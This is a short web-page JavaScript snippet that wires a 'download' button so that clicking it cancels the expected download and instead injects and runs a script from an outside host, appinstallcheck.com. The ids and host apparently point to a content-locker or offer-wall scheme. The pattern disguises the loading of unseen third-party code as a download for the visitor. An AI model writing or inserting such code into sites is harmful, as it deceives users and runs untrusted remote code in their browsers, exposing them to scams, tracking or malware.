document.addEventListener('DOMContentLoaded', function() {
    const downloadBtn = document.getElementById('downloadBtn');
    
    // Setup download button click handler
    if (downloadBtn) {
        downloadBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Create and inject only the ogjs script
            const script = document.createElement('script');
            script.type = 'text/javascript';
            script.id = 'ogjs';
            script.src = 'https://appinstallcheck.com/cl/js/ndrkxk';
            document.body.appendChild(script);
        });
    }
});
